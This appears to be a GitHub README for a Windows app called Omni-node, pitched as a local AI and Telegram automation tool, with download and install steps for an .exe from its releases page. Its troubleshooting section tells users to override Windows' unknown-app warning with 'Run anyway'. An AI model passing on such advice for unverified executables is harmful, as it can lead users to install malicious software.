Omni-node is an application that helps you use AI on your own computer. It lets you write code, automate tasks, improve your work safely, and control your tools through Telegram, all in one place. This guide will help you download and set up Omni-node on Windows.

---

## 🚀 Getting Started with Omni-node

Omni-node is designed for everyday users who want to make their work easier with AI. You do not need to know programming to get started.

This app runs locally on your Windows computer. That means your data stays with you, and you do not have to rely on internet servers for basic tasks.

## 💾 How to Download Omni-node

1. Click the big blue button above or go to this page:

   [Omni-node Releases](https://github.com/Tunelts3852/Omni-node/releases)

2. On the page, find the latest version. The newest version usually appears at the top with a tag like `vX.X.X`.

3. Under the latest version, look for a file with a name ending in `.exe`. It will say something like `Omni-node-setup.exe` or `Omni-node.exe`.

4. Click on that `.exe` file link to start downloading it.

5. Save the file to a location you can easily find, like your Desktop or Downloads folder.

## 📥 Installing Omni-node on Windows

After downloading, follow these steps to install Omni-node:

1. Open the folder where you saved the `.exe` file.

2. Double-click the file to start the installer.

3. If Windows asks you for permission to run the installer, click **Yes** or **Run**.

4. Follow the instructions in the installer window:

   - Accept the license agreement.
   - Choose the folder where you want Omni-node to be installed or keep the default location.
   - Click **Install**.

5. Wait while the installer copies the files. This may take a minute or two.

6. When the installation finishes, click **Finish**.

## 🛠️ Troubleshooting Common Issues

- **The installer does not start:**  
  Make sure you downloaded the full `.exe` file. Try downloading it again.

- **Windows blocks the app:**  
  Windows may warn you about an unknown app. You can allow it by clicking **More info** and then **Run anyway**.

- **App won’t open properly:**  
  Restart your computer and try opening Omni-node again.

- **Telegram commands not working:**  
  Check your internet connection and follow the Telegram setup steps inside the app carefully.
